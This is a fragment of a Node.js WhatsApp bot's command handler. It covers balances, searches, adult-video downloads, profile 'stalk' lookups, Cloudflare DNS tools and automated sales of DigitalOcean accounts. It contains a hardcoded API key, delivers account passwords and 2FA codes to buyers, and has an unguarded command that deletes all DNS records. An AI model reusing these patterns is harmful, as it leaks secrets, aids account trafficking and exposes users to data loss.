let scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));

// Validasi index script
if (scriptIndex < 0 || scriptIndex >= scriptsData.scripts.length) {
return reply("❌ *Nomor script tidak valid!*");
}

// Ambil detail script yang akan dihapus
const scriptToDelete = scriptsData.scripts[scriptIndex];

// Hapus file script dari folder
try {
const filePath = path.join(scriptFolder, path.basename(scriptToDelete.filePath));
if (fs.existsSync(filePath)) {
fs.unlinkSync(filePath);
}
} catch (fileDeleteError) {
console.error('Error menghapus file:', fileDeleteError);
}

// Hapus script dari database
scriptsData.scripts.splice(scriptIndex, 1);

// Simpan perubahan ke database
fs.writeFileSync(scriptPath, JSON.stringify(scriptsData, null, 2));

// Kirim konfirmasi
reply(`✅ *Script berhasil dihapus!*\n📜 Nama : ${scriptToDelete.name}\n💰 Harga : Rp ${scriptToDelete.price.toLocaleString()}`);

} catch (error) {
console.error('Delete Script Error:', error);
reply("❌ *Gagal menghapus script.*");
}
break;
}

//-> Fitur Saldo <-//
case "addsaldo": {
// Cek apakah yang menjalankan adalah creator
if (!isCreator) return reply("❌ Maaf, hanya owner yang dapat menggunakan perintah ini.");

// Validasi argumen input
const args = m.text.split(" ");
if (args.length < 3) {
return reply(`Penggunaan: ${prefix}addsaldo nomor nominal\n\nContoh: ${prefix}addsaldo 000 10000`);
}

// Ekstrak nomor dan nominal
const nomorUser = args[1];
const nominal = parseInt(args[2]);
const userJid = `${nomorUser}@s.whatsapp.net`;

// Validasi nomor hp
if (!/^\d+$/.test(nomorUser)) {
return reply("❌ Nomor hp harus berupa angka!");
}

// Validasi nominal
if (isNaN(nominal) || nominal <= 0) {
return reply("❌ Nominal saldo harus berupa angka positif!");
}

const saldoFilePath = "./source/saldo.json";

try {
// Baca file saldo
const saldoData = fs.existsSync(saldoFilePath)
? JSON.parse(fs.readFileSync(saldoFilePath, "utf-8"))
: {};

// Update saldo
if (saldoData[userJid]) {
saldoData[userJid] += nominal;
} else {
saldoData[userJid] = nominal;
}

// Simpan perubahan saldo
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await client.sendMessage(m.chat, {
  text: `✅ Berhasil menambahkan saldo:\n📱 Pengguna: ${nomorUser}\n💰 Nominal: Rp${nominal.toLocaleString()}\n\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`,
  footer: "Danny S8X",
  buttons: [
{ buttonId: '.owner', buttonText: { displayText: 'Owner Danny S8X' }, type: 1,},
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'message',
sections: [
{
title: 'Pilih Menu',
highlight_label: 'S8X',
rows: [
{ title: "🔹️CEK SALDO", description: "Untuk Cek Saldo Member Anda", id: `.saldo`}, 
{ title: "🔹 PRODUK MENU", description: "Untuk Menampilkan Produk Menu", id: `.produk`},
]}]})}}],
  headerType: 1,
  viewOnce: true,
}, { quoted: loli });
// Kirim notifikasi ke nomor yang bersangkutan
const notificationMessage = `💰 Informasi Saldo\n\nSaldo Anda telah ditambahkan:\n💵 Nominal: Rp${nominal.toLocaleString()}\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`;

await client.sendMessage(`${nomorUser}@s.whatsapp.net`, {
text: notificationMessage
});

} catch (error) {
console.error("Error menambah saldo:", error);
reply("❌ Terjadi kesalahan saat menambah saldo.");
}
}
break
case "delsaldo": {
if (!isCreator) return reply(mess.owner)
try {
const saldoFilePath = "./source/saldo.json";
if (!args[0] || !args[1]) {
return await reply("⚠️ Format salah! Gunakan: .kurangisaldo nomor nominal\nContoh: .delsaldo 000 5000");
}
const nomor = args[0];
const nominal = parseInt(args[1]);
if (isNaN(nominal) || nominal <= 0) {
return await reply("⚠️ Nominal harus berupa angka positif!");
}
if (!fs.existsSync(saldoFilePath)) {
return await reply("⚠️ File saldo tidak ditemukan!");
}
const saldoData = JSON.parse(fs.readFileSync(saldoFilePath, "utf-8") || "{}");

console.log("Data Saldo:", saldoData);
console.log("Nomor Input:", nomor);
const nomorFormat = `${nomor}@s.whatsapp.net`;
if (!saldoData[nomorFormat]) {
return await reply(`❌ Nomor ${nomorFormat} tidak ditemukan dalam data saldo!`);
}
if (saldoData[nomorFormat] < nominal) {
return await reply(
`❌ Saldo tidak mencukupi!\n💰 Saldo saat ini: Rp${saldoData[nomorFormat]}`
);
}
saldoData[nomorFormat] -= nominal;
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await reply(`✅ Saldo berhasil dikurangi!\n💰 Saldo terbaru untuk ${nomorFormat}: Rp${saldoData[nomorFormat]}`);
} catch (error) {
console.error("Error in kurangisaldo:", error);
await reply("❌ Terjadi kesalahan saat mengurangi saldo!");
}
}
break
case 'saldo': {
try {
const userId = m.sender;
let saldoDB;
try {
saldoDB = JSON.parse(fs.readFileSync('./source/saldo.json'));
} catch {
saldoDB = {}
}
if (!saldoDB[userId]) {
saldoDB[userId] = 0;
fs.writeFileSync('./source/saldo.json', JSON.stringify(saldoDB, null, 2));
}
const saldo = saldoDB[userId];
await client.sendMessage(m.chat, { text: `*乂 Cek Saldo Anda*
💰 *Saldo Anda:* Rp${saldo.toLocaleString('id-ID')}
📌 *Pengguna:* @${userId.split('@')[0]}

*_Bot Whatsapp Simple Bot V11_*`, mentions: [userId] }, { quoted: loli });
} catch (error) {
console.error("Error on .saldo:", error);
await client.sendMessage(m.chat, { text: "❌ Terjadi kesalahan saat mengecek saldo. Silakan coba lagi nanti." 
});
}
break;
}

case "gimage": {
if (!text) return reply(example("anime dark"))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pint = await fetchJson(`https://restapi-v2.simplebot.my.id/search/gimage?q=${text}`)
let pin = pint.result
if (pin.length > 5) await pin.splice(0, 6)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
try {
let imgsc = await prepareWAMessageMedia({ image: {url: a.url}}, { upload: client.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
} catch {}
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *google*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: loli})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "sfile": {
if (!text) return reply(example('script bot whatsapp'))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/sfile?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Link :* ${res.link}\n\n`
}
await reply(teks)
}
break

case "xnxx": {
if (!text) return reply(example('step sister'))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Info :* ${res.info}
* *Link :* ${res.link}\n\n`
}
await reply(teks)
}
break

case 'xvid': {
				if (!text) return reply(`*Example :*\n\nXvid Japan\n\n_NOTE_\nStelah Memasukan Japan Dan Muncul URL, Ketik Ulang, Xvid Sertakan URL Nya\n\nXvid URL`);
				if (!text) return reply('Please provide a search query or a valid Xvideos URL.');
				const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
				try {
					if (isURL) {
						const result = await xvideosdl(text);
						const {
							title,
							url
						} = result.result;
						const response = await fetch(url);
						const buffer = await response.arrayBuffer();
						let msgs = generateWAMessageFromContent(m.chat, {
							viewOnceMessage: {
								message: {
									"messageContextInfo": {
										"deviceListMetadata": {},
										"deviceListMetadataVersion": 2
									},
									interactiveMessage: proto.Message.InteractiveMessage.create({
										body: proto.Message.InteractiveMessage.Body.create({
											text: `Here you go!\nTitle : ${title}`
										}),
										footer: proto.Message.InteractiveMessage.Footer.create({
											text: packname
										}),
										header: proto.Message.InteractiveMessage.Header.create({
											hasMediaAttachment: false,
											...await prepareWAMessageMedia({
												video: Buffer.from(buffer)
											}, {
												upload: client.waUploadToServer
											})
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
											buttons: [{
												"name": "quick_reply",
												"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
											}],
										}),
										contextInfo: {
											mentionedJid: [m.sender],
											forwardingScore: 999,
											isForwarded: true,
											forwardedNewsletterMessageInfo: {
												newsletterJid: global.idSaluran,
												newsletterName: packname,
												serverMessageId: 143
											}
										}
									})
								}
							}
						}, {
							quoted: loli
						})
						await client.relayMessage(m.chat, msgs.message, {})
					} else {
						const results = await xvideosSearch(text);
						if (results.length === 0) {
							reply('No search results found for the given query.');
						} else {
							const searchResults = results.map((result, index) => {
								return `${index + 1}. *${result.title}*\nDuration : ${result.duration}\nQuality : ${result.quality}\nURL : ${result.url}`;
							}).join('\n\n');
							let msgs = generateWAMessageFromContent(m.chat, {
								viewOnceMessage: {
									message: {
										"messageContextInfo": {
											"deviceListMetadata": {},
											"deviceListMetadataVersion": 2
										},
										interactiveMessage: proto.Message.InteractiveMessage.create({
											body: proto.Message.InteractiveMessage.Body.create({
												text: `*Search Results for "${text}" :*\n\n${searchResults}`
											}),
											footer: proto.Message.InteractiveMessage.Footer.create({
												text: packname
											}),
											header: proto.Message.InteractiveMessage.Header.create({
												hasMediaAttachment: false,
												...await prepareWAMessageMedia({
													image: fs.readFileSync("./source/media/Xyz.jpg"),
												}, {
													upload: client.waUploadToServer
												})
											}),
											nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
												buttons: [{
													"name": "quick_reply",
													"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
												}],
											}),
											contextInfo: {
												mentionedJid: [m.sender],
												forwardingScore: 999,
												isForwarded: true,
												forwardedNewsletterMessageInfo: {
													newsletterJid: global.idSaluran,
													newsletterName: packname,
													serverMessageId: 143
												}
											}
										})
									}
								}
							}, {
								quoted: loli
							})
							await client.relayMessage(m.chat, msgs.message, {})
						}
					}
				} catch (error) {
					console.error(error);
					return reply('Failed To Fetch Xvideos Video Details.');
				}
			};
			break
		

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "npm": case "npmsearch": {
if (!text) return reply(example('axios'))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* ${res.title}
* ${res.update.split("T")[0]}
* ${res.links.npm}\n\n`
}
await reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playstore": {
if (!text) return reply(example('free fire'))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/playstore?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.nama}
* *Developer :* ${res.developer}
* *Rating :* ${res.rate}
* *Link :* ${res.link}\n\n`
}
await reply(teks)
}
break

case "tiktokstalk": case "ttstalk": {
if (!text) return example("username")
try {
const res = await fetchJson(`https://api.neoxr.eu/api/ttstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Nama :* ${res.data.name}
* *Username :* ${res.data.username}
* *Bio :* ${res?.data?.bio || ""}
* *Followers :* ${res.data.followers}
* *Following :* ${res.data.following}
* *Postingan :* ${res.data.posts}
* *Region :* ${res.data.region}
* *Private :* ${res.data.private == true ? "Ya" : "Tidak"}
`
await client.sendMessage(m.chat, {image: {url: res.data.photo}, caption: teks}, {quoted: loli})
} catch (err) {
return reply("Error : "+err)
}
}
break

case "igstalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/igstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Nama :* ${res.data.name}
* *Username :* ${res.data.username}
* *Total Postingan :* ${res.data.post}
* *Followers :* ${res.data.follower}
* *Following :* ${res.data.following}
* *About :* ${res.data.about}
`
await client.sendMessage(m.chat, {image: {url: res.data.photo}, caption: teks}, {quoted: loli})
} catch (err) {
return reply("Error : "+err)
}
}
break

case "ytstalk": case "youtubestalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/ytstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Nama :* ${res.data.name}
* *Subscribers :* ${res.data.subscribers}
* *Total Video :* ${res.data.videos}
* *Description :* ${res.data.description}
* *UrL :* ${res.data.url}
`
await client.sendMessage(m.chat, {image: {url: res.data.avatar}, caption: teks}, {quoted: loli})
} catch (err) {
return reply("Error : "+err)
}
}
break

case "githubstalk": case "ghstalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/ghstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Username :* ${res.data.login}
* *Nama :* ${res.data.name}
* *Followers :* ${res.data.followers}
* *Following :* ${res.data.following}
* *Bio :* ${res.data.bio}
* *Repository :* ${res.data.public_repos}
* *Type :* ${res.data.type}
* *Company :* ${res.data.company}
* *Blog :* ${res.data.blog}
* *Lokasi :* ${res.data.location}
* *Created At :* ${res.data.created_at}
* *Update At :* ${res.data.updated_at}
`
await client.sendMessage(m.chat, {image: {url: res.data.avatar_url}, caption: teks}, {quoted: loli})
} catch (err) {
return reply("Error : "+err)
}
}
break

case "nulis": {
if (!text) return example("Danny S8X Adalah Dev Ganteng")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/nulis?text=${text}&apikey=zakkigans12`)
const teks = `${mess.done}`
await client.sendMessage(m.chat, {image: {url: res.data.url}, caption: teks}, {quoted: loli})
} catch (err) {
return reply("Error : "+err)
}
}
break

case 'addpendapatan': {
    if (!isCreator) return reply(mess.owner);

    if (m.quoted || text) {
        const [harga, namaBarang, pembayaran, total, tanggal] = text.split("|").map(v => v.trim());
        // Format: harga|nama barang|pembayaran|total|tanggal

        if (!harga || !namaBarang || !pembayaran || !total || !tanggal) {
            return reply(`⚠️ *Format salah!* Gunakan:\n${command} harga|nama barang|pembayaran|total|tanggal`);
        }

        const newData = {
            harga: parseInt(harga),
            namaBarang: namaBarang,
            pembayaran: pembayaran,
            total: parseInt(total),
            tanggal: tanggal,
            waktu: getWaktuWIB() // Fungsi untuk mendapatkan waktu dalam WIB
        };

        pendapatanList.push(newData);
        fs.writeFileSync("./source/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

        reply(`✅ *Berhasil menambahkan pendapatan:*\n` +
                `📦 *Nama Barang*: ${newData.namaBarang}\n` +
                `💰 *Harga*: Rp${newData.harga}\n` +
                `💳 *Pembayaran*: ${newData.pembayaran}\n` +
                `📊 *Total*: Rp${newData.total}\n` +
                `📅 *Tanggal*: ${newData.tanggal}\n` +
                `⏰ *Waktu*: ${newData.waktu}`);
    } else {
        return reply(`⚠️ *Format salah!* Gunakan:\n${command} harga|nama barang|pembayaran|total|tanggal`);
    }
}
break;

case 'delpendapatan': {
    if (!isCreator) return reply(mess.owner);

    const namaBarang = text.trim();
    // Format: nama barang

    if (!namaBarang) {
        return reply(`⚠️ *Format salah!* Gunakan:\n${command} nama barang`);
    }

    const index = pendapatanList.findIndex(p => p.namaBarang === namaBarang);

    if (index === -1) {
        return reply(`❌ *Gagal!* Data dengan nama barang *${namaBarang}* tidak ditemukan.`);
    }

    // Menghapus data pendapatan dari daftar
    const deletedData = pendapatanList.splice(index, 1)[0];
    fs.writeFileSync("./source/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

    reply(`✅ *Berhasil menghapus pendapatan:*\n` +
            `📦 *Nama Barang*: ${deletedData.namaBarang}\n` +
            `💰 *Harga*: Rp${deletedData.harga}\n` +
            `💳 *Pembayaran*: ${deletedData.pembayaran}\n` +
            `📊 *Total*: Rp${deletedData.total}\n` +
            `📅 *Tanggal*: ${deletedData.tanggal}\n` +
            `⏰ *Waktu*: ${deletedData.waktu}`);
}
break;

case 'listpendapatan': {
    if (!isCreator) return reply(mess.owner);

    if (pendapatanList.length < 1) {
        return reply("Tidak ada data pendapatan saat ini. ❌");
    }

    let totalSemua = 0;
    let teksnya = `📜 *DAFTAR PENDAPATAN* 📜\n\n`;

    pendapatanList.forEach((p, i) => {
        teksnya += `➡️ ${i + 1}. 📦 *Nama Barang*: ${p.namaBarang}\n` +
                   `   💰 *Harga*: Rp${p.harga}\n` +
                   `   💳 *Pembayaran*: ${p.pembayaran}\n` +
                   `   📊 *Total*: Rp${p.total}\n` +
                   `   📅 *Tanggal*: ${p.tanggal}\n` +
                   `   ⏰ *Waktu*: ${p.waktu}\n\n`;

        totalSemua += p.total; // Menjumlahkan total pendapatan
    });

    teksnya += `━━━━━━━━━━━━━━━━━━━━\n` +
               `🤑 *TOTAL SEMUA PENDAPATAN*: Rp${totalSemua.toLocaleString("id-ID")}\n`;

    client.sendMessage(m.chat, { text: teksnya }, { quoted: qtoko });
}
break;

case "deepseek": case "depsek": case "deepsek": {
let talk = text ? text : "Hallo Kamu Siapa ?"
await fetchJson(`https://restapi.simplebot.my.id/ai/deepseek?apikey=${global.apipayment}&text=` + talk).then(async (res) => {
await reply(res.result)
}).catch(e => reply(e.toString()))
}
break

case "ocr": {
if (!/image/.test(mime)) return reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ocr?url=${dd}`)
await client.sendMessage(m.chat, {text: resnya.result.toString()}, {quoted: loli})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "removebg": {
if (!/image/.test(mime)) return reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi.simplebot.my.id/imagecreator/removebg?apikey=${global.apipayment}&url=${dd}`)
await client.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: loli})
}
break



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `.buydo ${urutt += 1}`
})
}
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Order Akun Do`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.QrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.qrisOrderKuota}`);
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Digitalocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await client.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await client.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: loli})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./storage/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "adddomaincf": case "adddomcf": {
if (!isOwner) return reply(mess.owner)
if (!text || !text.includes(".")) return example("domainmu.com")
const CLOUDFLARE_TOKEN = global.apitoken_cloudflare
const CLOUDFLARE_EMAIL = global.email_cloudflare
const cloudflare = axios.create({
    baseURL: 'https://api.cloudflare.com/client/v4',
    headers: {
        'Authorization': `Bearer ${CLOUDFLARE_TOKEN}`,
        'Content-Type': 'application/json'
    }
});
async function addNewDomainToCloudflare(domainName) {
    try {
        const response = await cloudflare.post('/zones', {
            name: domainName,
            account: {
                id: global.accountid_cloudflare
            },
            plan: {
                id: 'free'
            },
            type: 'full',
            jump_start: true
        });
        return response.data
    } catch (error) {
        return 'Gagal menambahkan domain:' + JSON.stringify(error.response ? error.response.data : error.message, null, 2)
    }
}
let res = await addNewDomainToCloudflare(text.toLowerCase())
if (res?.result?.name_servers) {
let respon = `
Domain ${text.toLowerCase()} Berhasil Ditambahkan Kedalam Cloudflare ✅

*Name Server :*
* ns1 ${res.result.name_servers[0]}
* ns2 ${res.result.name_servers[1]}
`
return reply(respon)
} else {
return reply(JSON.stringify(res, null, 2))
}
}
break

case "clearsubdo": case "clearallsubdo": case "clsubdo": case "clearsubdomain": {
if (!text || !text.includes("|")) return example('zoneid|apikey')
let [apizone, apitoken] = text.split("|")
const CLOUDFLARE_API_KEY = apitoken;  // Ganti dengan API key
const CLOUDFLARE_ZONE_ID = apizone;  // Ganti dengan Zone ID

async function getAllDNSRecords() {
    let allRecords = [];
    let page = 1;
    let totalPages = 1;

    try {
        while (page <= totalPages) {
            const response = await axios.get(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records`, {
                params: { page, per_page: 100 },
                headers: {
                    'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.data.success) {
                console.error("Gagal mengambil DNS records:", response.data.errors);
                return [];
            }

            allRecords.push(...response.data.result);
            totalPages = response.data.result_info.total_pages;
            page++;
        }
    } catch (error) {
        console.error("Terjadi kesalahan saat mengambil DNS records:", error.message);
    }
    return allRecords;
}

// Fungsi untuk menghapus semua DNS record
async function deleteAllDNSRecords() {
    try {
        const records = await getAllDNSRecords();
        const totalDns = records.length

        if (records.length === 0) {
            await reply("Tidak ada Subdomain yang ditemukan.");
            return;
        }

        reply(`${totalDns} Subdomain ditemukan. Memproses penghapusan...`);

        for (const record of records) {
            try {
                const deleteResponse = await axios.delete(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records/${record.id}`, {
                    headers: {
                        'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (deleteResponse.data.success) {
                    console.log(`✅ Berhasil menghapus record: ${record.name} (ID: ${record.id})`);
                } else {
                    console.error(`❌ Gagal menghapus record ${record.name}:`, deleteResponse.data.errors);
                }
            } catch (error) {
                console.error(`❌ Terjadi kesalahan saat menghapus record ${record.name}:`, error.message);
            }
        }

        await reply(`Berhasil menghapus ${totalDns} Subdomain ✅`);
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
}

// Jalankan fungsi
return deleteAllDNSRecords();
}
break

case "listdomaincf": case "listdomcf": {
if (!isOwner) return reply(mess.owner)
const CLOUDFLARE_API_KEY = global.apitoken_cloudflare // Ganti dengan API Key atau API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Email akun Cloudflare (jika pakai API Key)

async function getAllDomains() {
    let page = 1;
    let domains = [];
    let hasMore = true;

    while (hasMore) {
        const url = `https://api.cloudflare.com/client/v4/zones?page=${page}&per_page=50`; // Maksimal 50 per halaman

        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`, // Jika pakai API Token
                // 'X-Auth-Email': CLOUDFLARE_EMAIL, // Jika pakai API Key
                // 'X-Auth-Key': CLOUDFLARE_API_KEY  // Jika pakai API Key
            }
        });

        const data = await response.json();
        
        if (data.success) {
            domains = domains.concat(data.result.map(zone => ({
                id: zone.id,
                name: zone.name,
                status: zone.status
            })));

            // Cek apakah masih ada halaman berikutnya
            hasMore = data.result_info.page < data.result_info.total_pages;
            page++;
        } else {
            console.error('Gagal mengambil daftar domain:', data.errors);
            return [];
        }
    }

    console.log('Total Domain:', domains.length);
    console.log('Daftar Domain:', domains);
    return domains;
}


// Jalankan function
let res = await getAllDomains();
if (res.length < 1) return reply("Tidak ada domain di cloudflare")
let teks = `\n*Total Domain Cloudflare :* ${res.length}\n`
for (let i of res) {
teks += `
* ${i.name}
* *Status :* ${i.status == "active" ? i.status + " ✅" : i.status == "pending" ? i.status + " 🕞" : i.status + " ❌"}
`
}
return reply(teks)
}
break

case "adddomain": case "adddom": {
if (!isOwner) return reply(mess.owner)
let [dom, zone, api] = text.split("|")
if (!dom || !zone || !api) return example("domain|zoneid|apitoken")
dom = dom.toLowerCase()
if (domains[dom]) return reply(`Domain ${dom} sudah terdaftar di dalam database subdomain`)
domains[dom] = {
zone: zone, 
apitoken: api
}
await fs.writeFileSync("./source/data/domain.json", JSON.stringify(domains, null, 2))
reply(`Berhasil menambahkan domain ${dom} ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

